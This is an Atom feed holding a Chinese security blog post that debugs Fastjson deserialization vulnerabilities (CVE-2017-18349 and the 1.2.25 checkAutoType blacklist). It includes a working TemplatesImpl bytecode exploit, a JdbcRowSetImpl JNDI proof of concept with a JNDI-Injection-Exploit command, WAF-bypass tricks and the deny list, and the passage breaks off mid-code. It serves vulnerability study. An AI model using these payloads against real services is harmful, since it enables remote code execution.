<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>n4c1&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-09-10T06:47:38.372Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>n4c1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Fastjson反序列化</title>
    <link href="http://example.com/2025/09/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2025/09/10/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-09-10T06:46:57.000Z</published>
    <updated>2025-09-10T06:47:38.372Z</updated>
    
    <content type="html"><![CDATA[<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)"></a>fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349)</h2><p>之前虽然也学了fastjson历史漏洞, 也跟着其他师傅的文章调试了一遍, 但大多囫囵吞枣, 也忘得差不多了, 最近又遇到很多fastjson的题目, 打算不看文章, 自己重新过一遍fastjson反序列化的流程, 文中解释与用词可能不太准确, 师傅们轻喷</p><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>先看exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> javassist.CannotCompileException;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;  </span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonWithTemplatesImpl</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;  </span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(test.class.getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">randonClassName</span> <span class="operator">=</span> <span class="string">&quot;n4c1&quot;</span> + System.nanoTime();  </span><br><span class="line">        cc.setName(randonClassName);  </span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">byte</span>[] evilCode = cc.toBytecode();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCodeBase64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(evilCode);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EVIL_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + EVIL_CLASS + <span class="string">&quot;\&quot;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCodeBase64 + <span class="string">&quot;\&quot;],&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_name&#x27;:&#x27;a.b&#x27;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;  </span><br><span class="line">            System.out.println(payload);  </span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField); <span class="comment">// 允许反序列化非公有属性  </span></span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>通过调试源码, 可用大致梳理出json字符串解析流程<br>首先我们可以看见几个非常重要的类, 他们分别扮演了以下角色:</p><ul><li>json解析器(<code>json paser</code>)  ,对应 <code>com.alibaba.fastjson.parser.DefaultJSONParser</code>, </li><li>词法分析器(<code>lexer</code>), 主要作用是对各个token进行解析(即字符层面的识别), 通俗的说就是在一长串json字符串中定位出键与值.</li><li>反序列化器(<code>deserilizer</code>), 主要作用是反序列化出各个类, 不同的类对应不同的反序列化器, 由json解析器通过ParserConfig来获取. 对于一个JavaBean, 对应的反序列化器是<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer</code></li></ul><p>json解析器 (<code>DefaultJSONParser</code>)包装了词法分析器(<code>lexer</code>), 而反序列化器与json解析器在解析json字符串时互相依赖 (准确地说, json解析器负责解析出反序列化需要的数据, 反序列化器负责使用这些数据来还原出这个对象,  由于json是一个可以嵌套的结构, 因此这一过程往往是交错进行的)</p><p>可以去看一下DefaultJSONParser的属性如下图</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527220313.png" alt="image.png"></p><p>反序列化器则定义在<code>ParserConfig</code>中<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527220524.png" alt="image.png"></p><p>在本例中, 由于我们传入的基础类是<code>Object.class</code>, 当我们从<code>Object.class</code>开始, json解析器(<code>DefaultJSONParser</code>)拿到<code>Object.class</code>的反序列化器, 开始反序列化. 在此基础上, 开始解析json字符串, 这个工作由<code>DefaultJSONParser</code>发起. 由其包装的词法分析器(<code>lexer</code>)逐字读取并分析, 当词法分析器读到<code>@type</code>时,  发现需要反序列化出来一个类, 获取该类名称为 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>, 此时<code>DefaultJSONParser</code>获取该类的反序列化器(即<code>JavaBeanDeserializer</code>), 由此反序列化器进行反序列化. 初始化该反序列化器时会读取<code>JavaBean</code>的各种信息并保存起来, 包括<code>setter</code>, <code>Field</code>, <code>getter</code>, 很多师傅所说的对<code>getter</code>和<code>setter</code>方法的要求也就是在这一过程产生的.</p><p>拿到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的反序列化器后, 之后的过程交由<code>JavaBeanDeserializer</code>进行, 开始反序列化, 首先是使用默认的构造器创建一个<code>TemplatesImpl</code>的实例, 之后为其逐一添加属性, 此时词法分析器会扫描json字符串中<code>TemplatesImpl</code>类的字段(<code>Field</code>), 并进行添加, 此过程中<code>JavaBeanDeserializer</code>会获取并使用字段反序列化器(<code>FieldDeserializer</code>)来对字段的信息进行识别和反序列化(因为字段也可能是任何类型的对象),  <code>FieldDeserializer</code>会尝试调用<code>getter</code>和<code>setter</code>为对应的属性赋值, 本例中恶意字节码加载从此处开始触发, 当读到<code>_outputProperties</code>这个字段时,(这里json中的字符串虽然是<code>_outputProperties</code>, 但是会自动将其识别为<code>outputProperties</code>, 这个过程由smartMatch方法完成), 调用它的getter, 触发恶意类加载.<br>具体的getter和setter调用过程由FieldDeserializer的setValue方法执行,  &#x3D;&#x3D;当该字段有settter时直接调用setter而不调用getter, 无settter时调用getter&#x3D;&#x3D;尝试获取已经生成的对象中对应字段的引用, 并为其赋值</p><p>以上是我对反序列化过程的大致过程的理解, 这些解释是在调试的过程中得出的, 那么就从头来跟一下调试过程吧!</p><p>不必多说, 我们遇到的第一个关键步骤就是这里:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530154047.png" alt="image.png"></p><p>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;    通过输入的json字符串, 获取对应的json解析器(其中包含lexer), 通过初始类型(<code>Object.class</code>), 获取其反序列化器, 开始反序列化, this指针将当前的json解析器也传给了反序列化器, 因为反序列化的过程是需要解析json的</p><p>跟进 </p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530154827.png" alt="image.png"></p><p>由于此时我们传入的是Object.class这样一个很宽泛的对象, fastjson首先判断其是否为一个泛型数组, 这是因为如果要反序列化出数组, 那么就可以直接可以将键值对插入到一个Array中, 而若只单单是一个Object.class, 其中不存在任何属性, 无法将得到的属性放进去, 需要后续使用fastjson自己实现的JSONObjcet这个类(一个map)来暂存. Serializable.class也是类似, 并不能实例化后向其中添加属性</p><p>继续跟进, 会走到这里<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530165435.png" alt="image.png"><br>正如上面的解释, 此时实例了一个JSONObject<br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;    <code>lexer</code>识别到第一个字符<code>&#123;</code>, 实例出JSONObject, 准备解析出json字符串中的数据往里面添加</p><p>继续跟进, 来到这一步<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530170321.png" alt="image.png"><br>在这里,前面的过程大致就是判断了json格式的正确性, 以及使lexer的指针跳过多余但允许出现的符号(逗号, 注释)<br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;   扫描出第一个key为<code>@type</code></p><p>继续往下看, lexer会扫描出类的名称, 之后json解析器加载这个类, 通过这个类获取对应的反序列化器, 进行反序列化<br>注意获取的反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530172742.png" alt="image.png"><br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;   拿到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的反序列化器, 这一过程中, 也已经拿到了字段反序列化器,其中包含了getter, setter 如上图.  师傅们可以自行调试查看过程, 为了不打断连贯性, 这个过程有空放在后面补充</p><p>继续跟进到这里<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531005754.png" alt="image.png"><br>这个方法的前面是对上下文信息和json格式的判断, 主要看这里的for循环, 先是对已经拿到的FieldDeserilizer进行遍历, 判断其操作的是否为一些基础类型,  当匹配到时, 标记<code>matchField = true;</code>跳过json字符串的扫描, 直接进入后面对属性赋值的过程,  从而使用特定的反序列化方式进而提升效率<br>这里我们的恶意类有以下三个字段反序列化器, 都不是特殊类型<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531011256.png" alt="image.png"></p><p>这个过程结束后, 就是逐个字段扫描并赋值, 当走到 key为_outputProperties时,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531011753.png" alt="image.png"></p><p>拿到键名, 进行一些特殊键名的判断, 开始解析<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012122.png" alt="image.png"></p><p>拿到_outputProperties字段的反序列化器, 开始反序列化字段<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012257.png" alt="image.png"><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012345.png" alt="image.png"><br>跟进<br>通过&#x3D;&#x3D;FieldValue反序列化器&#x3D;&#x3D;拿到值后, setValue赋值<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012635.png" alt="image.png"></p><p>跟进<br>触发getter<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012807.png" alt="image.png"><br>如开篇总结所说_outputProperties是一个readonly属性(只有getter), fastjson会尝试调用它的getter获得内部map的引用来为其赋值</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPoc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ubjazx\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(PoC);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试流程与上面一样, 只不过这里使用的是jndi<br>使用JNDI-Injection-Exploit起一个ldap服务即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A 127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><p>在默认的<code>DefaultJSONParser</code>中有以下行为可能可以用来绕过waf<br>默认开启允许任意数量逗号</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527155617.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527155938.png" alt="image.png"><br>skipWhitespace()函数会调用skipComment(); 可以添加注释<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527160630.png" alt="image.png"></p><p>添加注释<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527160955.png" alt="image.png"></p><h2 id="fastjson-1-2-25-反序列化漏洞-对抗checkAutoType的开始"><a href="#fastjson-1-2-25-反序列化漏洞-对抗checkAutoType的开始" class="headerlink" title="fastjson 1.2.25 反序列化漏洞 对抗checkAutoType的开始"></a>fastjson 1.2.25 反序列化漏洞 对抗checkAutoType的开始</h2><h3 id="利用缓存绕过黑名单"><a href="#利用缓存绕过黑名单" class="headerlink" title="利用缓存绕过黑名单"></a>利用缓存绕过黑名单</h3><p>在此版本中, 上面的exp已经用不了了, 有以下报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.JSONException: autoType is not support. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:844)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:322)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)</span><br><span class="line">at com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze(JavaObjectDeserializer.java:45)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639)</span><br><span class="line">at com.alibaba.fastjson.JSON.parseObject(JSON.java:339)</span><br><span class="line">at com.alibaba.fastjson.JSON.parseObject(JSON.java:302)</span><br><span class="line">at FastjsonWithTemplatesImpl.main(FastjsonWithTemplatesImpl.java:41)</span><br></pre></td></tr></table></figure><p>autoType禁用了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类, 也就是<code>@type</code>不允许此类, 我们在报错位置打断点, 看看是哪里出问题了<br>可以看见断点在了下面这个位置<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531130503.png" alt="image.png"></p><p>这是在ParseConfig中的checkAutoType方法, 上面提到过ParseConfig有一个很重要的作用是用来存放反序列化器, 这里很明显更新后的版本又增加了对需要加载的类的类名的限制, 设置了一个黑名单, 以黑名单中起始的包名都将直接报错<br>具体黑名单如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0 = &quot;bsh&quot;</span><br><span class="line">1 = &quot;com.mchange&quot;</span><br><span class="line">2 = &quot;com.sun.&quot;</span><br><span class="line">3 = &quot;java.lang.Thread&quot;</span><br><span class="line">4 = &quot;java.net.Socket&quot;</span><br><span class="line">5 = &quot;java.rmi&quot;</span><br><span class="line">6 = &quot;javax.xml&quot;</span><br><span class="line">7 = &quot;org.apache.bcel&quot;</span><br><span class="line">8 = &quot;org.apache.commons.beanutils&quot;</span><br><span class="line">9 = &quot;org.apache.commons.collections.Transformer&quot;</span><br><span class="line">10 = &quot;org.apache.commons.collections.functors&quot;</span><br><span class="line">11 = &quot;org.apache.commons.collections4.comparators&quot;</span><br><span class="line">12 = &quot;org.apache.commons.fileupload&quot;</span><br><span class="line">13 = &quot;org.apache.myfaces.context.servlet&quot;</span><br><span class="line">14 = &quot;org.apache.tomcat&quot;</span><br><span class="line">15 = &quot;org.apache.wicket.util&quot;</span><br><span class="line">16 = &quot;org.codehaus.groovy.runtime&quot;</span><br><span class="line">17 = &quot;org.hibernate&quot;</span><br><span class="line">18 = &quot;org.jboss&quot;</span><br><span class="line">19 = &quot;org.mozilla.javascript&quot;</span><br><span class="line">20 = &quot;org.python.core&quot;</span><br><span class="line">21 = &quot;org.springframework&quot;</span><br></pre></td></tr></table></figure><p>我们往回调, 看看是从哪里调用到了checkAutoType<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531131011.png" alt="image.png"><br>如上图, 在json解析器parseObject中进行了调用, 在上个版本中, lexer扫描出类名后会直接loadClass, &#x3D;&#x3D;这个版本则是用ParseConfig.checkAutoType这个方法来加载类&#x3D;&#x3D;, 这个方法会对需要加载的类进行&#x3D;&#x3D;黑名单判断&#x3D;&#x3D;</p><p>这个黑名单涵盖的类算是非常多了, 直接找到一个可用的类比较困难, 我们先来看看checkAutoType是如何工作的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);  </span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = deserializers.findClass(typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger  </span></span><br><span class="line">                || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">                ) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  